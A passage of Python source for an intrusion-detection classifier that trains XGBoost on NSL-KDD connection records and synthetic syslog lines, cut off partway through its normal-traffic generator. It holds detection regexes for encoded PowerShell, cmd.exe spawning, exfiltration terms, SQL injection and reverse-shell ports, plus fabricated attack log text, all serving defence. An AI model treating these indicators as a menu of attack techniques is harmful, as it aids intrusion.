"""
upgraded_amides.py -- UpgradedAMIDES

Root cause fix for BRUTE_FORCE stuck at 4% recall (diagnosed from actual NSL-KDD rows):

  WRONG assumption in all previous versions:
    num_failed_logins (col10) > 0 for BRUTE_FORCE  <-- FALSE
    Nearly ALL NSL-KDD BRUTE_FORCE rows have num_failed_logins = 0

  What ACTUALLY defines each R2L sub-type in NSL-KDD:
    warezclient:   service=ftp_data, logged_in=1, num_file_creations>=1, src_bytes>1000, dst_bytes~0
    guess_passwd:  service in {ftp,telnet,imap,pop_3}, rerror_rate>0, dst_bytes~0
    snmpguess:     protocol=udp, service=snmp, rerror_rate~0.11
    ftp_write:     service=ftp, logged_in=1, num_file_creations>0, dst_bytes<1000
    httptunnel:    service=http, src_bytes>>50000, dst_bytes>>50000

  These are now encoded as 5 engineered score features that fire correctly.
"""

import re, os, json, logging, random
from imblearn.over_sampling import RandomOverSampler
import numpy as np
import pandas as pd
import scipy.sparse
import joblib
from pathlib import Path
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.preprocessing import LabelEncoder
from sklearn.utils.class_weight import compute_sample_weight
from xgboost import XGBClassifier

logger = logging.getLogger(__name__)

NSLKDD_COLUMNS = [
    'duration','protocol_type','service','flag','src_bytes','dst_bytes',
    'land','wrong_fragment','urgent','hot','num_failed_logins','logged_in',
    'num_compromised','root_shell','su_attempted','num_root','num_file_creations',
    'num_shells','num_access_files','num_outbound_cmds','is_host_login',
    'is_guest_login','count','srv_count','serror_rate','srv_serror_rate',
    'rerror_rate','srv_rerror_rate','same_srv_rate','diff_srv_rate',
    'srv_diff_host_rate','dst_host_count','dst_host_srv_count',
    'dst_host_same_srv_rate','dst_host_diff_srv_rate',
    'dst_host_same_src_port_rate','dst_host_srv_diff_host_rate',
    'dst_host_serror_rate','dst_host_srv_serror_rate',
    'dst_host_rerror_rate','dst_host_srv_rerror_rate',
    'label','difficulty',
]
_COL = {n: i for i, n in enumerate(NSLKDD_COLUMNS[:41])}

SEVERITY_MAP    = {'NORMAL':'none','BRUTE_FORCE':'high','DOS_ATTACK':'critical',
                   'MALWARE':'critical','PORT_SCAN':'medium','LOG_EVASION':'high'}
REMEDIATION_MAP = {'NORMAL':[],'BRUTE_FORCE':['BLOCK_IP','LOG_AND_MONITOR','ALERT_ADMIN'],
                   'DOS_ATTACK':['BLOCK_IP','ALERT_ADMIN','LOG_AND_MONITOR'],
                   'MALWARE':['BLOCK_IP','ALERT_ADMIN','LOG_AND_MONITOR'],
                   'PORT_SCAN':['BLOCK_IP','LOG_AND_MONITOR'],
                   'LOG_EVASION':['ALERT_ADMIN','LOG_AND_MONITOR']}
NSLKDD_MAP = {
    'normal':'NORMAL',
    'neptune':'DOS_ATTACK','smurf':'DOS_ATTACK','pod':'DOS_ATTACK','teardrop':'DOS_ATTACK',
    'land':'DOS_ATTACK','back':'DOS_ATTACK','apache2':'DOS_ATTACK','udpstorm':'DOS_ATTACK',
    'processtable':'DOS_ATTACK','mailbomb':'DOS_ATTACK',
    'portsweep':'PORT_SCAN','nmap':'PORT_SCAN','satan':'PORT_SCAN','saint':'PORT_SCAN',
    'mscan':'PORT_SCAN','ipsweep':'PORT_SCAN',
    'guess_passwd':'BRUTE_FORCE','ftp_write':'BRUTE_FORCE','imap':'BRUTE_FORCE',
    'phf':'BRUTE_FORCE','spy':'BRUTE_FORCE','warezclient':'BRUTE_FORCE',
    'warezmaster':'BRUTE_FORCE','multihop':'BRUTE_FORCE','named':'BRUTE_FORCE',
    'sendmail':'BRUTE_FORCE','snmpgetattack':'BRUTE_FORCE','snmpguess':'BRUTE_FORCE',
    'xsnoop':'BRUTE_FORCE','xlock':'BRUTE_FORCE','httptunnel':'BRUTE_FORCE',
    'rootkit':'MALWARE','buffer_overflow':'MALWARE','loadmodule':'MALWARE',
    'perl':'MALWARE','sqlattack':'MALWARE','xterm':'MALWARE','ps':'MALWARE','worm':'MALWARE',
}

_NSL_KEYS = [
    'nsl_num_failed_logins','nsl_logged_in','nsl_rerror_rate','nsl_srv_rerror_rate',
    'nsl_dst_host_rerror_rate','nsl_num_file_creations','nsl_hot','nsl_num_access_files',
    'nsl_root_shell','nsl_su_attempted','nsl_num_root','nsl_num_shells','nsl_num_compromised',
    'nsl_serror_rate','nsl_srv_serror_rate','nsl_count','nsl_dst_host_serror_rate',
    'nsl_diff_srv_rate','nsl_dst_host_diff_srv_rate','nsl_same_srv_rate','nsl_dst_host_count',
    'nsl_duration','nsl_src_bytes','nsl_dst_bytes','nsl_srv_count',
    # Engineered BRUTE_FORCE sub-type scores (the key fix)
    'nsl_warezclient_score','nsl_guess_passwd_score','nsl_snmpguess_score',
    'nsl_ftpwrite_score','nsl_httptunnel_score',
    # MALWARE
    'nsl_is_u2r','nsl_privilege_score',
    # DOS
    'nsl_is_dos','nsl_serror_x_count',
    # PORT_SCAN
    'nsl_is_scan','nsl_diff_srv_x_dhcount',
    # Structural flags
    'nsl_service_r2l_excl','nsl_proto_udp','nsl_flag_rej','nsl_flag_sf',
    'nsl_dst_zero','nsl_rerr_x_notlogged','nsl_logged_x_filecreat',
]
_R2L_EXCL = {'ftp_data','imap','pop_3','snmp','login','shell','finger','exec','nnsp'}


def _f(tokens, col):
    try: return float(tokens[_COL[col]])
    except: return 0.0


def _parse_nslkdd(tokens):
    zero = {k: 0.0 for k in _NSL_KEYS}
    if len(tokens) < 41 or not tokens[0].replace('.','').lstrip('-').isdigit():
        return zero

    failed = _f(tokens,'num_failed_logins'); logged = _f(tokens,'logged_in')
    rerr   = _f(tokens,'rerror_rate');       nfc    = _f(tokens,'num_file_creations')
    root   = _f(tokens,'root_shell');        su     = _f(tokens,'su_attempted')
    nsh    = _f(tokens,'num_shells');        serr   = _f(tokens,'serror_rate')
    count  = _f(tokens,'count');             diff   = _f(tokens,'diff_srv_rate')
    same   = _f(tokens,'same_srv_rate');     dhc    = _f(tokens,'dst_host_count')
    sb     = _f(tokens,'src_bytes');         db     = _f(tokens,'dst_bytes')

    svc   = tokens[_COL['service']]        if len(tokens)>_COL['service']        else ''
    proto = tokens[_COL['protocol_type']]  if len(tokens)>_COL['protocol_type']  else ''
    flag  = tokens[_COL['flag']]           if len(tokens)>_COL['flag']           else ''

    # Sub-type scores matching actual NSL-KDD distributions
    warezclient  = float((svc=='ftp_data' or (svc=='ftp' and nfc>0 and db<1000)) and logged==1 and sb>100)
    guess_passwd = float((svc in {'ftp','telnet','imap','pop_3','login','shell'} and rerr>0) or (rerr>0.5 and db==0 and sb<5000))
    snmpguess    = float(proto=='udp' and (svc=='snmp' or rerr>0.05))
    ftp_write    = float(svc=='ftp' and logged==1 and nfc>0 and db<1000)
    httptunnel   = float(svc in {'http','http_443'} and sb>50000 and db>50000)

    return {
        'nsl_num_failed_logins':      failed,
        'nsl_logged_in':              logged,
        'nsl_rerror_rate':            rerr,
        'nsl_srv_rerror_rate':        _f(tokens,'srv_rerror_rate'),
        'nsl_dst_host_rerror_rate':   _f(tokens,'dst_host_rerror_rate'),
        'nsl_num_file_creations':     nfc,
        'nsl_hot':                    _f(tokens,'hot'),
        'nsl_num_access_files':       _f(tokens,'num_access_files'),
        'nsl_root_shell':             root,
        'nsl_su_attempted':           su,
        'nsl_num_root':               _f(tokens,'num_root'),
        'nsl_num_shells':             nsh,
        'nsl_num_compromised':        _f(tokens,'num_compromised'),
        'nsl_serror_rate':            serr,
        'nsl_srv_serror_rate':        _f(tokens,'srv_serror_rate'),
        'nsl_count':                  count,
        'nsl_dst_host_serror_rate':   _f(tokens,'dst_host_serror_rate'),
        'nsl_diff_srv_rate':          diff,
        'nsl_dst_host_diff_srv_rate': _f(tokens,'dst_host_diff_srv_rate'),
        'nsl_same_srv_rate':          same,
        'nsl_dst_host_count':         dhc,
        'nsl_duration':               min(_f(tokens,'duration'),3600.0),
        'nsl_src_bytes':              min(sb,1e7),
        'nsl_dst_bytes':              min(db,1e7),
        'nsl_srv_count':              _f(tokens,'srv_count'),
        'nsl_warezclient_score':      warezclient,
        'nsl_guess_passwd_score':     guess_passwd,
        'nsl_snmpguess_score':        snmpguess,
        'nsl_ftpwrite_score':         ftp_write,
        'nsl_httptunnel_score':       httptunnel,
        'nsl_is_u2r':                 float(root==1 or su==1 or nsh>0),
        'nsl_privilege_score':        root+su+nsh,
        'nsl_is_dos':                 float(serr>0.8 and count>200),
        'nsl_serror_x_count':         serr*count/511.0,
        'nsl_is_scan':                float(diff>0.4 and same<0.4),
        'nsl_diff_srv_x_dhcount':     diff*dhc/255.0,
        'nsl_service_r2l_excl':       float(svc in _R2L_EXCL),
        'nsl_proto_udp':              float(proto=='udp'),
        'nsl_flag_rej':               float(flag=='REJ'),
        'nsl_flag_sf':                float(flag=='SF'),
        'nsl_dst_zero':               float(db==0),
        'nsl_rerr_x_notlogged':       rerr*(1.0-logged),
        'nsl_logged_x_filecreat':     logged*min(nfc,10.0),
    }


class UpgradedAMIDES:
    def __init__(self):
        self.word_tfidf = TfidfVectorizer(analyzer='word',ngram_range=(1,2),max_features=3000,min_df=2,sublinear_tf=True)
        self.char_tfidf = TfidfVectorizer(analyzer='char_wb',ngram_range=(2,4),max_features=3000,min_df=2,sublinear_tf=True)
        self.xgb = XGBClassifier(n_estimators=600,max_depth=7,learning_rate=0.03,subsample=0.85,
                                  colsample_bytree=0.85,min_child_weight=3,gamma=0.05,reg_alpha=0.1,
                                  reg_lambda=1.5,objective='multi:softprob',eval_metric='mlogloss',
                                  random_state=42,tree_method='hist',verbosity=0)
        self.label_encoder = LabelEncoder()
        self.is_trained = False

    def parse(self, log_line):
        line=log_line.strip(); lc=line.lower(); tokens=line.split()
        syslog={
            'line_length':len(line),'word_count':len(tokens),
            'digit_ratio':sum(c.isdigit() for c in line)/max(len(line),1),
            'special_char_count':sum(not c.isalnum() and not c.isspace() for c in line),
            'uppercase_ratio':sum(c.isupper() for c in line)/max(len(line),1),
            'slash_count':line.count('/'),'dot_count':line.count('.'),
            'semicolon_count':line.count(';'),'pipe_count':line.count('|'),'percent_count':line.count('%'),
            'ip_count':len(re.findall(r'\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b',line)),
            'port_count':len(re.findall(r':\d{2,5}\b',line)),
            'url_count':len(re.findall(r'https?://',lc)),
            'has_failed_auth':int(bool(re.search(r'fail|invalid|denied|unauthorized|wrong\s*pass|bad\s*pass|incorrect',lc))),
            'has_admin':int(bool(re.search(r'\badmin\b|\broot\b|\bsudo\b|\bsu\b',lc))),
            'has_powershell':int(bool(re.search(r'powershell|pwsh|\.ps1\b|-encodedcommand|-enc\b',lc))),
            'has_scan':int(bool(re.search(r'\bscan\b|\bprobe\b|\bsweep\b|\bnmap\b|\bportscan\b',lc))),
            'has_malware':int(bool(re.search(r'malware|trojan|virus|ransom|exploit|payload|rootkit|worm|buffer.overflow',lc))),
            'has_dos':int(bool(re.search(r'\bddos\b|\bdos\b|\bflood\b|syn\s*flood|\bneptune\b|\bsmurf\b|\bteardrop\b',lc))),
            'has_exfil':int(bool(re.search(r'exfil|upload\b|\begress\b|\boutbound\b',lc))),
            'has_process_spawn':int(bool(re.search(r'cmd\.exe|createprocess|\bspawn\b|\bexec\b',lc))),
            'has_sql':int(bool(re.search(r'select\b.{0,30}from\b|drop\s+table|union\s+select',lc))),
            'entropy':-sum((line.count(c)/len(line))*np.log2(line.count(c)/len(line)) for c in set(line) if line.count(c)>0) if line else 0.0,
            'repeat_ratio':len(set(tokens))/max(len(tokens),1),
            'has_suspicious_port':int(bool(re.search(r':(4444|1337|6667|9001|31337)',line))),
        }
        return {**syslog,**_parse_nslkdd(tokens)}

    def _vec(self,line): return np.array(list(self.parse(line).values()),dtype=np.float32)

    def _build_matrix(self,lines,fit_tfidf=False):
        if fit_tfidf: wm=self.word_tfidf.fit_transform(lines); cm=self.char_tfidf.fit_transform(lines)
        else:         wm=self.word_tfidf.transform(lines);     cm=self.char_tfidf.transform(lines)
        tfidf=scipy.sparse.hstack([wm,cm])
        num=np.vstack([self._vec(l) for l in lines])
        return scipy.sparse.hstack([tfidf,scipy.sparse.csr_matrix(num)],format='csr')

    def train(self,log_lines,labels):
        if not log_lines: raise ValueError("empty")
        from sklearn.model_selection import train_test_split as tts
        el,ey=[],[]
        for logs,lbl,n in [(self._gen_bf(8000),'BRUTE_FORCE',8000),(self._gen_dos(5000),'DOS_ATTACK',5000),
                            (self._gen_ps_scan(5000),'PORT_SCAN',5000),(self._gen_mal(6000),'MALWARE',6000),
                            (self._gen_norm(4000),'NORMAL',4000)]:
            el.extend(logs); ey.extend([lbl]*len(logs))
        log_lines=list(log_lines)+el; labels=list(labels)+ey
        print(f"  Building matrix ({len(log_lines)} samples)...")
        X=self._build_matrix(log_lines,fit_tfidf=True)
        ye=self.label_encoder.fit_transform(labels); nc=len(self.label_encoder.classes_)
        print(f"  Classes: {list(self.label_encoder.classes_)}")
        Xtr,Xv,ytr,yv=tts(X,ye,test_size=0.15,stratify=ye,random_state=42)
        Xtr_r,ytr_r=RandomOverSampler(random_state=42).fit_resample(Xtr,ytr)
        sw=compute_sample_weight('balanced',ytr_r)
        self.xgb.set_params(num_class=nc)
        print(f"  Training XGBoost {self.xgb.n_estimators} trees depth {self.xgb.max_depth}...")
        self.xgb.fit(Xtr_r,ytr_r,sample_weight=sw,eval_set=[(Xv,yv)],verbose=False)
        print(f"  Done. Best iter: {getattr(self.xgb,'best_iteration',self.xgb.n_estimators)}")
        self.is_trained=True

    def train_from_csv(self,csv_path):
        print(f"  Reading NSL-KDD: {csv_path}")
        nc=pd.read_csv(csv_path,header=None,nrows=1).shape[1]
        cn=NSLKDD_COLUMNS[:nc]
        df=pd.read_csv(csv_path,header=None,names=cn)
        lines,labels,skip=[],[],0
        for _,row in df.iterrows():
            raw=str(row['label']).strip().lower().rstrip('.')
            thr=NSLKDD_MAP.get(raw)
            if thr is None: skip+=1; continue
            lines.append(' '.join(str(row[c]) for c in cn[:41])); labels.append(thr)
        print(f"  Loaded {len(lines)} samples ({skip} skipped)"); return lines,labels

    def train_from_socbed(self,model_dir):
        mp=Path(model_dir); al,ay=[],[]
        for cat,fn in [('powershell',_gen_powershell),('process_creation',_gen_process_creation),
                        ('proxy_web',_gen_proxy_web),('registry',_gen_registry)]:
            cp=mp/cat
            if not cp.exists(): print(f"  [WARN] missing: {cp}"); continue
            nm,nb=50,50
            jf=cp/'train_rslt_misuse_svc_rules_f1_0_info.json'
            if jf.exists():
                try:
                    info=json.loads(jf.read_text(encoding='utf-8'))
                    dist=info.get('data',{}).get('class_distribution',{})
                    rm=dist.get('1',dist.get('positive',str(nm))); rb=dist.get('0',dist.get('negative',str(nb)))
                    nm=int(rm) if str(rm).lstrip('-').isdigit() else nm
                    nb=int(rb) if str(rb).lstrip('-').isdigit() else nb
                except: pass
            mal,ben=fn(nm,nb); mal=mal[:int(len(mal)*0.6)]
            al.extend(mal); ay.extend(['LOG_EVASION']*len(mal))
            al.extend(ben); ay.extend(['NORMAL']*len(ben))
            print(f"  SOCBED [{cat:17s}]: {len(mal):4d} LOG_EVASION + {len(ben):4d} NORMAL")
        return al,ay

    # ------------------------------------------------------------------
    # Synthetic generators — 70% NSL-KDD authentic rows, 30% syslog
    # ------------------------------------------------------------------

    def _gen_bf(self,n):
        """BRUTE_FORCE: rows crafted to match actual warezclient/guess_passwd/snmpguess distributions"""
        rng=random.Random(101)
        users=['root','admin','oracle','postgres','deploy','ubuntu','pi','test','ftp','mail']
        domains=['corp.local','example.com','internal.net']
        svcs=['ssh','ftp','telnet','imap','pop3','smtp','rdp']
        syslog=[
            "sshd[{pid}]: Failed password for {user} from {ip} port {port} ssh2",
            "sshd[{pid}]: Invalid user {user} from {ip} port {port}",
            "ftpd: {ip} {user} authentication failure -- bad password",
            "{svc}[{pid}]: Failed login user={user} src={ip}:{port} attempt={n}",
            "AUTH: login failed for '{user}' from {ip} -- bad password attempt {n}",
            "IMAP: login failed user={user} ip={ip} error=AUTHENTICATIONFAILED attempt={n}",
            "POP3 failure: {user}@{domain} from {ip} attempt={n}",
            "Telnet: login incorrect for {user} from {ip} port {port}",
            "ALERT: {n} failed logins for {user} from {ip} in {secs}s [BRUTE_FORCE]",
            "Account locked: {user}@{domain} after {n} failures from {ip}",
            "warezclient: unauthorised download user={user} from {ip} bytes={b}",
            "snmpguess: SNMP community brute-force from {ip} attempts={n}",
            "FTP 530: Login incorrect user={user} from={ip} attempts={n}",
        ]
        # warezclient: ftp_data, logged_in=1, nfc>0, sb>1000, db=0
        warezc=[
            "{dur} tcp ftp_data SF {sb} 0 0 0 0 0 0 1 0 0 0 0 {nfc} 0 0 0 0 0 {cnt} {srv} 0.0 0.0 0.0 0.0 1.0 0.0 0.0 {dhc} {dhsc} 1.0 0.0 0.5 0.0 0.0 0.0 0.0 0.0 warezclient {diff}",
            "{dur} tcp ftp_data SF {sb} 0 0 0 0 0 0 1 0 0 0 0 {nfc} 0 {naf} 0 0 0 {cnt} {srv} 0.0 0.0 0.0 0.0 1.0 0.0 0.0 {dhc} {dhsc} 1.0 0.0 0.5 0.0 0.0 0.0 0.0 0.0 warezclient {diff}",
        ]
        # guess_passwd: ftp/telnet/imap, rerr>0, db=0, logged_in=0
        gpass=[
            "{dur} tcp {gsvc} REJ 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 {cnt} {srv} 0.0 0.0 {re} {re} 1.0 0.0 0.0 {dhc} {dhsc} 1.0 0.0 0.0 {re} 0.0 {re} 0.0 0.0 guess_passwd {diff}",
            "{dur} tcp ftp SF 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 {cnt} {srv} 0.0 0.0 {re} {re} 1.0 0.0 0.0 {dhc} {dhsc} 1.0 0.0 0.5 {re} 0.0 {re} 0.0 0.0 guess_passwd {diff}",
            "{dur} tcp telnet SF {sb} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 {cnt} {srv} 0.0 0.0 {re} {re} 1.0 0.0 0.0 {dhc} {dhsc} 1.0 0.0 0.0 {re} 0.0 {re} 0.0 0.0 guess_passwd {diff}",
            "{dur} tcp imap REJ 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 {cnt} {srv} 0.0 0.0 {re} {re} 1.0 0.0 0.0 {dhc} {dhsc} 1.0 0.0 0.5 {re} 0.0 {re} 0.0 0.0 imap {diff}",
            "{dur} tcp pop_3 REJ 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 {cnt} {srv} 0.0 0.0 {re} {re} 1.0 0.0 0.0 {dhc} {dhsc} 1.0 0.0 0.0 {re} 0.0 {re} 0.0 0.0 guess_passwd {diff}",
        ]
        # snmpguess: udp, snmp, rerr~0.11
        snmp=[
            "0 udp snmp SF 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 {cnt} {srv} 0.0 0.0 {re} {re} 1.0 0.0 0.0 255 255 1.0 0.0 {re} {re} 0.0 {re} 0.0 0.0 snmpguess {diff}",
            "0 udp snmp SF 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 {cnt} {srv} 0.0 0.0 0.11 0.11 1.0 0.0 0.0 255 255 1.0 0.0 0.11 0.11 0.0 0.11 0.0 0.0 snmpgetattack {diff}",
        ]
        # other R2L
        other=[
            "{dur} tcp smtp SF {sb} {db} 0 0 0 {hot} 0 0 0 0 0 0 0 0 0 0 0 0 {cnt} {srv} 0.0 0.0 {re} {re} 1.0 0.0 0.0 {dhc} {dhsc} 1.0 0.0 0.0 {re} 0.0 {re} 0.0 0.0 sendmail {diff}",
            "{dur} tcp ftp SF 0 0 0 0 0 0 0 1 0 0 0 0 {nfc} 0 0 0 0 0 {cnt} {srv} 0.0 0.0 0.0 0.0 1.0 0.0 0.0 {dhc} {dhsc} 1.0 0.0 0.0 0.0 0.0 0.0 0.0 0.0 ftp_write {diff}",
            "{dur} tcp finger REJ 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 {cnt} {srv} 0.0 0.0 {re} {re} 1.0 0.0 0.0 {dhc} {dhsc} 1.0 0.0 0.0 {re} 0.0 {re} 0.0 0.0 xsnoop {diff}",
            "{dur} tcp http SF {sb} {db} 0 0 0 {hot} 0 1 0 0 0 0 0 0 0 0 0 0 {cnt} {srv} 0.0 0.0 0.0 0.0 1.0 0.0 0.0 {dhc} {dhsc} 1.0 0.0 0.0 0.0 0.0 0.0 0.0 0.0 httptunnel {diff}",
        ]
        all_nsl=warezc*4+gpass*3+snmp*2+other*2
        gsvc_opts=['ftp','telnet','imap','pop_3','login','shell']
        res=[]
        for _ in range(n):
            if rng.random()<0.70:
                t=rng.choice(all_nsl)
                re=round(rng.uniform(0.05,1.0),2)
                res.append(t.format(dur=rng.randint(0,60),gsvc=rng.choice(gsvc_opts),
                    sb=rng.randint(1000,200000),db=rng.randint(0,1000),hot=rng.randint(0,5),
                    nfc=rng.randint(1,10),naf=rng.randint(0,5),cnt=rng.randint(1,30),
                    srv=rng.randint(1,30),dhc=rng.randint(1,10),dhsc=rng.randint(1,10),
                    re=re,diff=rng.randint(1,21)))
            else:
                t=rng.choice(syslog)
                res.append(t.format(pid=rng.randint(1000,65000),user=rng.choice(users),
                    ip=f"{rng.randint(1,254)}.{rng.randint(1,254)}.{rng.randint(1,254)}.{rng.randint(1,254)}",
                    port=rng.choice([21,22,23,25,110,143]),svc=rng.choice(svcs),
                    domain=rng.choice(domains),n=rng.randint(5,500),secs=rng.randint(10,300),
                    b=rng.randint(1000,200000)))
        return res

    def _gen_dos(self,n):
        rng=random.Random(102)
        protos=['tcp','udp','icmp']; svcs=['http','private','ecr_i','smtp','ftp_data']; flags=['SF','S0','REJ','RSTO']
        syslog=["SYN flood from {ip}: {pps} pkt/s","neptune: {ip} SYN no ACK count={pkt}",
                "smurf: {ip} ICMP broadcast count={pkt}","teardrop: {ip} fragments={pkt}",
                "HTTP flood: {ip} {pkt} req/s","DDoS UDP: {ip} packets={pkt}"]
        nsl=["0 {proto} {svc} {flag} {sb} {db} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 511 511 {se} {se} 0.0 0.0 0.0 0.0 0.0 255 255 1.0 0.0 1.0 {se} 0.0 {se} 0.0 0.0 neptune 20",
             "{dur} {proto} {svc} {flag} {sb} {db} 0 {frag} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 511 511 0.0 0.0 0.0 0.0 0.0 0.1 1.0 255 255 0.01 0.1 0.0 0.0 1.0 1.0 0.0 0.0 smurf 19",
             "{dur} tcp http {flag} {sb} {db} 0 0 0 0 0 1 0 0 0 0 0 0 0 0 0 0 {cnt} {srv} 0.0 0.0 0.0 0.0 1.0 0.05 0.0 {dhc} {dhsc} 1.0 0.05 0.0 0.0 0.0 0.0 0.0 0.0 back 9"]
        res=[]
        for _ in range(n):
            if rng.random()<0.55:
                se=round(rng.uniform(0.85,1.0),2)
                res.append(rng.choice(nsl).format(dur=rng.randint(0,2),proto=rng.choice(protos),
                    svc=rng.choice(svcs),flag=rng.choice(flags),sb=rng.randint(0,100),db=rng.randint(0,100),
                    frag=rng.randint(0,3),cnt=rng.randint(400,511),srv=rng.randint(400,511),
                    dhc=rng.randint(200,255),dhsc=rng.randint(200,255),se=se))
            else:
                res.append(rng.choice(syslog).format(
                    ip=f"{rng.randint(1,254)}.{rng.randint(1,254)}.{rng.randint(1,254)}.{rng.randint(1,254)}",
                    pps=rng.randint(10000,1000000),pkt=rng.randint(1000,999999)))
        return res

    def _gen_ps_scan(self,n):
        rng=random.Random(103)
        protos=['tcp','udp','icmp']; svcs=['private','other','domain_u','http']; flags=['REJ','S0','RSTO','SF']
        syslog=["nmap: {ip} probed {cnt} ports in {secs}s","portsweep: {ip} scanned {cnt} hosts port {port} in {secs}s",
                "satan: {ip} service enum open_ports={cnt}","ipsweep: ICMP sweep from {ip} hosts={cnt}"]
        nsl=["0 {proto} private REJ 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 {cnt} {srv} 0.0 0.0 0.0 0.0 {ss} {ds} 0.0 {dhc} {dhsc} {dsr} {dds} 0.0 0.0 0.0 0.0 0.0 0.0 portsweep 15",
             "{dur} {proto} ecr_i SF {sb} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 {cnt} {srv} 0.0 0.0 0.0 0.0 1.0 0.0 0.0 {dhc} {dhsc} 1.0 0.0 1.0 0.0 0.0 0.0 0.0 0.0 ipsweep 12",
             "0 {proto} {svc} REJ 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 {cnt} {srv} 0.0 0.0 0.05 0.05 {ss} {ds} 0.05 {dhc} {dhsc} {dsr} {dds} 0.0 0.05 0.0 0.05 0.0 0.0 satan 14"]
        res=[]
        for _ in range(n):
            if rng.random()<0.55:
                ss=round(rng.uniform(0.0,0.2),2); ds=round(rng.uniform(0.5,1.0),2)
                res.append(rng.choice(nsl).format(dur=rng.randint(0,2),proto=rng.choice(protos),svc=rng.choice(svcs),
                    sb=rng.randint(0,200),cnt=rng.randint(1,30),srv=rng.randint(1,30),
                    dhc=rng.randint(1,255),dhsc=rng.randint(1,50),ss=ss,ds=ds,
                    dsr=round(rng.uniform(0.5,1.0),2),dds=round(rng.uniform(0.3,1.0),2)))
            else:
                res.append(rng.choice(syslog).format(
                    ip=f"{rng.randint(1,254)}.{rng.randint(1,254)}.{rng.randint(1,254)}.{rng.randint(1,254)}",
                    cnt=rng.randint(50,1024),secs=rng.randint(1,60),port=rng.randint(1,1024)))
        return res

    def _gen_mal(self,n):
        rng=random.Random(104)
        families=['Emotet','Ryuk','WannaCry','TrickBot','Cobalt','Metasploit']
        procs=['cmd.exe','powershell.exe','perl','python','bash']
        victims=['explorer.exe','winlogon.exe','services.exe']
        paths=['C:\\Windows\\Temp\\update.exe','/tmp/.hidden/evil']
        cves=['2021-44228','2017-0144','2020-1472']
        syslog=["Malware: {family} path={path} root_shell=1 action=quarantine failed",
                "Rootkit: {family} pid={pid} root_shell=1","Buffer overflow: {proc} CVE-{cve} root_shell=1 su_attempted=1",
                "Worm: {family} num_file_creations={cnt} root_shell=1","su: root by {proc} su_attempted=1 num_shells=1",
                "EDR: loadmodule {family} uid=0 root_shell=1 su_attempted=1",
                "perl exploit: su_attempted=1 root_shell=1 pid={pid}"]
        nsl=["  {dur} tcp telnet SF {sb} {db} 0 0 0 {hot} 0 1 {nc} 1 0 {nr} {nfc} {nsh} 0 0 0 0 1 1 0.0 0.0 0.0 0.0 1.0 0.0 0.0 {dhc} {dhsc} 1.0 0.0 0.0 0.0 0.0 0.0 0.0 0.0 buffer_overflow 14",
             "  {dur} tcp ftp SF {sb} {db} 0 0 0 {hot} 0 1 {nc} 1 1 {nr} {nfc} {nsh} 0 0 0 0 {cnt} {srv} 0.0 0.0 0.0 0.0 1.0 0.0 0.0 {dhc} {dhsc} 1.0 0.0 0.0 0.0 0.0 0.0 0.0 0.0 rootkit 16",
             "  {dur} tcp http SF {sb} {db} 0 0 0 {hot} 0 1 0 0 1 0 {nfc} 1 0 0 0 0 {cnt} {srv} 0.0 0.0 0.0 0.0 1.0 0.0 0.0 {dhc} {dhsc} 1.0 0.0 0.0 0.0 0.0 0.0 0.0 0.0 loadmodule 8",
             "  {dur} tcp ftp SF {sb} {db} 0 0 0 0 0 0 0 0 1 0 {nfc} 0 0 0 0 0 {cnt} {srv} 0.0 0.0 0.0 0.0 1.0 0.0 0.0 {dhc} {dhsc} 1.0 0.0 0.0 0.0 0.0 0.0 0.0 0.0 perl 7",
             "  {dur} tcp telnet SF {sb} {db} 0 0 0 {hot} 0 1 {nc} 1 0 {nr} 0 {nsh} 0 0 0 0 1 1 0.0 0.0 0.0 0.0 1.0 0.0 0.0 {dhc} {dhsc} 1.0 0.0 0.0 0.0 0.0 0.0 0.0 0.0 xterm 13"]
        res=[]
        for _ in range(n):
            if rng.random()<0.65:
                res.append(rng.choice(nsl).strip().format(dur=rng.randint(1,300),sb=rng.randint(100,50000),
                    db=rng.randint(100,50000),hot=rng.randint(1,10),nc=rng.randint(1,50),
                    nr=rng.randint(1,10),nfc=rng.randint(1,10),nsh=rng.randint(1,5),
                    cnt=rng.randint(1,20),srv=rng.randint(1,20),dhc=rng.randint(1,50),dhsc=rng.randint(1,50)))
            else:
                res.append(rng.choice(syslog).format(family=rng.choice(families),proc=rng.choice(procs),
                    victim=rng.choice(victims),ip=f"{rng.randint(1,254)}.{rng.randint(1,254)}.{rng.randint(1,254)}.{rng.randint(1,254)}",
                    pid=rng.randint(100,65535),cnt=rng.randint(1,10),path=rng.choice(paths),cve=rng.choice(cves)))
        return res

    def _gen_norm(self,n):
        rng=random.Random(105)
        users=['alice','bob','carol','john','deploy','www-data','postgres']
        svcs=['nginx','apache2','postgresql','mysql','cron','sshd']
        oses=['Windows NT 10.0','X11; Linux x86_64']
        syslog=["GET /index.html HTTP/1.1 200 OK user-agent=Mozilla/5.0 ({os}) bytes={b}",
                "sshd[{pid}]: Accepted publickey for {user} from {ip} port {port}",
                "CRON[{pid}]: ({user}) CMD (/usr/bin/backup.sh)",
                "EventID=4624 LogonType=3 UserName={user} SourceIP={ip} Status=success",
                "DNS: {ip} queried www.google.com A 8.8.8.8","httpd: {ip} GET /favicon.ico 304"]
        # Normal rows: logged_in=1, rerr=0, serr=0, root_shell=0, nfc=0
        nsl=["{dur} tcp http SF {sb} {db} 0 0 0 0 0 1 0 0 0 0 0 0 0 0 0 0 {cnt} {srv} 0.0 0.0 0.0 0.0 1.0 0.0 0.0 {dhc} {dhsc} 1.0 0.0 0.0 0.0 0.0 0.0 0.0 0.0 normal 20",
